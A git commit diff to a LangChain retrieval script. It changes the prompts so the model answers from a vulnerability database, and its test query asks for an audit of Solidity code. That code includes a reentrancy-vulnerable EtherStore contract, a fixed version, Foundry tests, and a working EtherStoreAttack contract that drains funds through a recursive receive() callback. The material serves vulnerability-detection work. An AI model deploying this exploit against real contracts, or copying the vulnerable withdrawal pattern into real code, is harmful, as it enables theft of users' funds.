1689d57db7557d0b154a4f6e3fedcb87b531b472
Jeff Yu <105130385+yu-jeffy@users.noreply.github.com>
2023-12-15 19:12:24 +0000

    prompt engineering

--- main.py
+++ main.py
@@ -20,17 +20,17 @@ client.api_key = os.getenv("OPENAI_API_KEY")
 llm = ChatOpenAI(openai_api_key=os.getenv("OPENAI_API_KEY"))
 
 # Define a template string for the prompt that will be used to rephrase a question.
-_template = """Given the following conversation and a follow up question, 
-rephrase the follow up question to be a standalone question.
+_template = """Given the following conversation and a follow up question, process the follow up into this format:
 
 Chat History:
 {chat_history}
 Follow Up Input: {question}
 Standalone question:"""
+
 CONDENSE_QUESTION_PROMPT = PromptTemplate.from_template(_template)
 
 # Define another template string for a prompt that will provide context and ask a question.
-template = """Answer the question based only on the following context:
+template = """Answer the prompt given the following context, taken from a database of known vulnerabilities. Provide code excerpts where possible:
 {context}
 
 Question: {question}
@@ -54,7 +54,7 @@ _inputs = RunnableParallel(
         chat_history=lambda x: get_buffer_string(x["chat_history"])
     )
     | CONDENSE_QUESTION_PROMPT
-    | ChatOpenAI(temperature=0.3)
+    | ChatOpenAI(temperature=0.3, max_tokens=2048)
     | StrOutputParser(),
 )
 
@@ -73,7 +73,108 @@ conversational_qa_chain = _inputs | _context | ANSWER_PROMPT | ChatOpenAI()
 # This will process the question, search for relevant context, and attempt to provide an answer.
 print(conversational_qa_chain.invoke(
     {
-        "question": "Write a withdrawal function in Solidity",
+        "question": """Check for vulnerabilties in this smart contract:
+            contract EtherStore {
+                mapping(address => uint256) public balances;
+
+                function deposit() public payable {
+                    balances[msg.sender] += msg.value;
+                }
+
+                function withdrawFunds(uint256 _weiToWithdraw) public {
+                    require(balances[msg.sender] >= _weiToWithdraw);
+                    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
+                    require(send, "send failed");
+
+                    // check if after send still enough to avoid underflow
+                    if (balances[msg.sender] >= _weiToWithdraw) {
+                        balances[msg.sender] -= _weiToWithdraw;
+                    }
+                }
+            }
+
+            contract EtherStoreRemediated {
+                mapping(address => uint256) public balances;
+                bool internal locked;
+
+                modifier nonReentrant() {
+                    require(!locked, "No re-entrancy");
+                    locked = true;
+                    _;
+                    locked = false;
+                }
+
+                function deposit() public payable {
+                    balances[msg.sender] += msg.value;
+                }
+
+                function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
+                    require(balances[msg.sender] >= _weiToWithdraw);
+                    balances[msg.sender] -= _weiToWithdraw;
+                    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
+                    require(send, "send failed");
+                }
+            }
+
+            contract ContractTest is Test {
+                EtherStore store;
+                EtherStoreRemediated storeRemediated;
+                EtherStoreAttack attack;
+                EtherStoreAttack attackRemediated;
+
+                function setUp() public {
+                    store = new EtherStore();
+                    storeRemediated = new EtherStoreRemediated();
+                    attack = new EtherStoreAttack(address(store));
+                    attackRemediated = new EtherStoreAttack(address(storeRemediated));
+                    vm.deal(address(store), 5 ether);
+                    vm.deal(address(storeRemediated), 5 ether);
+                    vm.deal(address(attack), 2 ether);
+                    vm.deal(address(attackRemediated), 2 ether);
+                }
+
+                function testReentrancy() public {
+                    attack.Attack();
+                }
+
+                function testFailRemediated() public {
+                    attackRemediated.Attack();
+                }
+            }
+
+            contract EtherStoreAttack is Test {
+                EtherStore store;
+
+                constructor(address _store) {
+                    store = EtherStore(_store);
+                }
+
+                function Attack() public {
+                    console.log("EtherStore balance", address(store).balance);
+
+                    store.deposit{value: 1 ether}();
+
+                    console.log(
+                        "Deposited 1 Ether, EtherStore balance",
+                        address(store).balance
+                    );
+                    store.withdrawFunds(1 ether); // exploit here
+
+                    console.log("Attack contract balance", address(this).balance);
+                    console.log("EtherStore balance", address(store).balance);
+                }
+
+                // fallback() external payable {}
+
+                // we want to use fallback function to exploit reentrancy
+                receive() external payable {
+                    console.log("Attack contract balance", address(this).balance);
+                    console.log("EtherStore balance", address(store).balance);
+                    if (address(store).balance >= 1 ether) {
+                        store.withdrawFunds(1 ether); // exploit here
+                    }
+                }
+            }""",
         "chat_history": [],
     }
-))
+).content)
